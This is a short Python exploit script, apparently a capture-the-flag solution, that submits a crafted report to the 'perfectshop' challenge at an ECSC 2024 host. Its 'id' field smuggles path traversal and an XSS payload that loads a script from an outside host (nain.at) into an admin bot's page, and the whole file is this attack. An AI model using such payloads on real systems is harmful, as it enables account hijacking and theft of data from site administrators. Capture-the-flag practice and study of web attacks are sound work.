import requests

url = "http://perfectshop.challs.open.ecsc2024.it/report?=/admin"

payload = {
    "id": "4&id=/../../search?q=<script src=//nain.at/x.js>/admin",
    "message": "Test"
}

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://perfectshop.challs.open.ecsc2024.it",
    "Referer": "http://perfectshop.challs.open.ecsc2024.it/report"
}

response = requests.post(url, data=payload, headers=headers)

if response.status_code == 200:
    print("Report submitted successfully")
else:
    print("Failed to submit report")
